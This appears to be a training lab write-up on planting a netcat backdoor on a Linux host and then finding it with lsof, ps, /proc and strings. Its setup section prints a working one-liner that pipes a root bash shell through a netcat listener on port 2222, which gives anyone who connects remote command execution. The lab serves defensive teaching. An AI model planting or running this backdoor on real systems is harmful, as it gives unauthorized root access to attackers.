# "Linux CLI Malware Detection: Netcat Backdoor

This lab is provided by Antisyphon Training's SOC Core Skills course. We will explore the setup and detection of backdoor malware using a netcat listener, a common tool for establishing unauthorized remote access. The exercise aims to simulate a real-world cyber threat scenario, providing hands-on experience in malware analysis and defense techniques. By leveraging the Linux Command Line Interface (CLI), we will detect and analyze the backdoor. 
<br>
<br>

## Create the malware 
- We will first sudo into root so that we can have a backdoor running root.
```
sudo su -
```
<br>
<br>

- This is a simple backdoor mechanism that uses netcat to create a network listener that pipes commands to and from a bash shell, allowing an attacker to remotely execute commands on the system by connecting to port 2222. 
```
mknod backpipe p
/bin/bash  0<backpipe | nc -l 2222 1>backpipe
```

![backdoor](https://github.com/trixiahorner/Linux_CLI/assets/162903587/d9187608-208a-4da0-99d3-70435d6ef994)
<br>
<br>

- We need the IP of our linux system so that we can connect
```
ifconfig
```
<br>
<br>

- Now let's connect from our windows system! Once connected, we can type some commands to ensure that it is working. As you can see, our Windows computer is connected to the simple Linux backdoor as root. This is the malware. Someone is listening.
```
ncat 172.17.231.122 2222
```

![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C2.png?raw=true)
<br>
<br>

## Linux CLI Analysis of malware
- Now we will start our analysis from the Linux CLI. Let's hunt and find our malware. Open up a window for analysis.
```
sudo su -
```
<br>
<br>

- Using lsof we can see a listening device and an established connection
```
lsof -i -P
```

![lsof](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C3.png?raw=true)
<br>
<br>

- We can look at the netcat process ID using the -p option. This will give us all the open files associated with the listed process ID (the netcat listener)
```
lsof -p 203
```

![lsof](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C4.png?raw=true)
<br>
<br>

- We can look at the full processes using the ps command (-a for all, -u to sort by user, -x to include the processes uning a teletype terminal)
```
ps aux
```

![psaux](https://github.com/trixiahorner/Linux_CLI/blob/main/images/c5.png?raw=true)
<br>
<br>

- The proc directory allows us to see data associated with the various processes directly. Let's cd into this directory and list the contents
```
cd /proc/203
ls
```

![proc](https://github.com/trixiahorner/Linux_CLI/blob/main/images/c6.png?raw=true)
<br>
<br>

- We can run strings on the exe in this directory (piping it through less). This can be used to attemp to identify what exactly a program is doing. There is a lot
  going on, but if you keep clicking the space bar, you will see the actual usage information for netcat.
  Now we see that the malware is netcat.
```
strings ./exe | less
```

![proc](https://github.com/trixiahorner/Linux_CLI/blob/main/images/c7.png?raw=true)

![proc](https://github.com/trixiahorner/Linux_CLI/blob/main/images/c8.png?raw=true)

<br>
<br>


# Conclusion
This lab is crucial for understanding the behavior of backdoor malware and the methodologies used to identify and respond to such threats effectively.
